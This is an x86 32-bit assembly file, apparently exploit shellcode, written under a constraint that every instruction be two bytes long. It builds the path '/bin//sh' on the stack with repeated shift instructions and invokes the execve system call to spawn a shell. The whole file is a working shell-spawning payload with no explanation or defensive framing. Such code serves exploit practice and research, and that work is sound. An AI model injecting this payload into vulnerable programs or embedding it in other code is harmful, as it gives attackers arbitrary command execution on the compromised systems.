BITS 32

; only 2 byte instructions

start:
	xor eax, eax

	push eax
	nop

	mov al, 0x68
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1

	mov al, 0x73
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	
	mov al, 0x2f
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	
	mov al, 0x2f

	push eax
	nop

	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	
	mov al, 0x6e
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1

	mov al, 0x69
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1

	mov al, 0x62
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1

	mov al, 0x2f

	push eax
	nop

	mov ebx, esp	; arg 0

	xor edx, edx	; arg 2

	push edx	;; null ptr
	nop

	push ebx	;; ptr to '/bin//sh'
	nop

	mov ecx, esp 	; arg1

	xor eax, eax

	mov al, 0xb	; execve

	int 0x80
		
